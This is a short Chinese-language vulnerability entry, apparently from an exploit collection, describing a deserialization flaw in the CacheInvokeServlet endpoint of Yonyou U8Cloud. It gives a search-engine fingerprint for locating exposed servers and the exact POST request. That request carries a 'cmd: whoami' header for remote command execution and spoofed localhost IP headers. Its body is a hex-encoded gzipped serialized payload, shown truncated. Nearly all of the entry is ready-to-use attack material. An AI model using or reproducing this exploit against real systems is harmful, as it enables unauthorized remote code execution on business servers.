# 用友U8Cloud-CacheInvokeServlet接口存在反序列化漏洞

- **系统**：用友　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app="用友-U8-Cloud"`
- **请求**：`POST /service/~iufo/com.ufsoft.iufo.web.appletinvoke.CacheInvokeServlet HTTP/1.1`
- **关键头**：`cmd: whoami`　`X-Forwarded-For: 127.0.0.1`　`X-Originating-IP: 127.0.0.1`　`X-Remote-Addr: 127.0.0.1`　`X-Remote-IP: 127.0.0.1`

**请求体 / payload**
```
{{hexdec(1f8b0800000000000000cd7bcb8f2beb7657df7dee55c80928373752148901adcda43b67d36dbbddbdbbb37580f5d5cbe56797cbcf3a8aa05cae2ebbabec72bbca2edb87c30009456294c10d11420206cc80488841221042110306884830210a63440620c15f00bf556577bbddbdf7d9370889aded2ebbbef5ade76f3dbe72f73ffd1f473f8ae647bf746f2fedb3453c0ece4a763432ddf85fca7ffbb7ffeeefff5ef18ba3a3d52cf9b34747476ffeca5f3de27f3f007d319c7b67f6cc7646ee99134e26e134c235085c271ef37bdf5d2fed60e19eb5c6eeb066cf94693c5fff9d7ff69ffefecd1ffc85fff2e6e84df5e80b90c4473fa9b2e0f3c09e7ae78dc13db67fc0d2c49ec547bf982db14ee7e0f061857b5fdc8521a4ffdaf748c7feb3aabd5963dbf4bff…（脚本共 13718 字，完整版见原文）
```